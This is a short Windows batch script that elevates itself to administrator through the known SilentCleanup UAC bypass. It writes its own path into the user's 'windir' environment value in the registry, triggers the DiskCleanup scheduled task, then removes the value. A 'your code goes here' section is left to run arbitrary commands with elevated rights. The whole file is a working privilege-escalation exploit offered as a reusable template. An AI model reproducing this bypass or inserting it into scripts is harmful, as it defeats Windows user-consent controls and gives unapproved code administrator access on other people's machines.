@echo off
::   SELF ELEVATING SCRIPT USING SILENTCLEANUP

net session >nul 2>&1
if %errorlevel% == 0 (
    echo.
    echo ==========================================================
    echo   This CMD is running with Administrator permissions.
    echo ==========================================================
    echo.
    pause
    goto main
)

:: SilentCleanup Bypass
reg add "HKCU\Environment" /v "windir" /t REG_SZ /d "%~f0" /f >nul 2>&1
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i >nul 2>&1
timeout /t 4 >nul 2>&1
reg delete "HKCU\Environment" /v "windir" /f >nul 2>&1

echo [INFO] Relaunching with admin rights...
exit /b

:main
:: your code goes here
pause
